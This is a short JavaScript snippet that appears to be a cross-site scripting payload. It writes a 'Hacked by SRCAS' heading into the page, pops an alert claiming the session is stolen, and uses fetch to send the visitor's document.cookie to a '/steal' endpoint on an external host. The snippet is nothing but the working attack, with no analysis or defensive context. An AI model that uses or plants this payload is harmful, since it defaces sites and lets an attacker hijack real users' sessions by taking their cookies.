console.log("Hello");
document.body.innerHTML += '<h1 style="color:red;">Hacked by SRCAS</h1>';
alert("Your session is stolen!");
fetch('https://srcas.ac.in/steal?cookie=' + encodeURIComponent(document.cookie));
